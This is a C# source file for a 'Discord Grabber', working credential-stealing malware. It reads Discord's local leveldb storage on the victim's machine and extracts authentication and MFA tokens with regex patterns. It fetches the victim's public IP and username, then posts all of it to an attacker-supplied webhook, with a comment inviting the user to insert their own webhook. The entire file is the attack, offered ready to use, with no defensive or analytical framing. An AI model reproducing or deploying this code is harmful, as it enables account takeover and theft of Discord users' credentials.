using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Net;
using System.IO;
using System.Text.RegularExpressions;
using System.Linq;
using System.Text;
using System.Security.Principal;
using static System.Net.WebRequestMethods;


namespace DiscordG
{
    class Program
    {
        public static string webhook = ConsoleApp1.Program.Webhook_link; // Your webhook goes here


        public static List<string> GetThem()
        {
            List<string> discordtokens = new List<string>();
            DirectoryInfo rootfolder = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Discord\Local Storage\leveldb");
            if (rootfolder.Exists)
            {
                foreach (var file in rootfolder.GetFiles("*.ldb"))
                {
                    string readedfile = file.OpenText().ReadToEnd();

                    foreach (Match match in Regex.Matches(readedfile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                        discordtokens.Add(match.Value + "\n");

                    foreach (Match match in Regex.Matches(readedfile, @"mfa\.[\w-]{84}"))
                        discordtokens.Add(match.Value + "\n");
                }


                discordtokens = discordtokens.ToList();

                Console.WriteLine(discordtokens);

                return discordtokens;
            }
            else return null;
        }
        
        public static string GetIP()
        {
            String address = "";
            WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
            using (WebResponse response = request.GetResponse())
            using (StreamReader stream = new StreamReader(response.GetResponseStream()))
            {
                address = stream.ReadToEnd();
            }

            int first = address.IndexOf("Address: ") + 9;
            int last = address.LastIndexOf("</body>");
            address = address.Substring(first, last - first);
            return address;
        }

        public static void SendMeResults(List<string> tokens)
        {
            string jsonPayload = "{\"content\": \"Report from Discord Grabber\\n\\nUsername: " + Environment.UserName + "\\nIP: " + GetIP() + "\\nTokens:\\n\\n" + string.Join("\\n", tokens) + "\\n\\n\"}";


            try
            {
                using (WebClient client = new WebClient())
                {
                    client.Headers.Add("Content-Type", "application/json");
                    string payload = jsonPayload;
                    client.UploadData(webhook, "POST", Encoding.UTF8.GetBytes(payload));
                }
                Console.WriteLine("Webhook sent successfully.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error sending webhook: {ex.Message}");
            }
            
           
        }
    }
    class Http
    {
        public static byte[] Post(string uri, NameValueCollection pairs)
        {
            using (WebClient webClient = new WebClient())
                return webClient.UploadValues(uri, pairs);
        }
    }
}
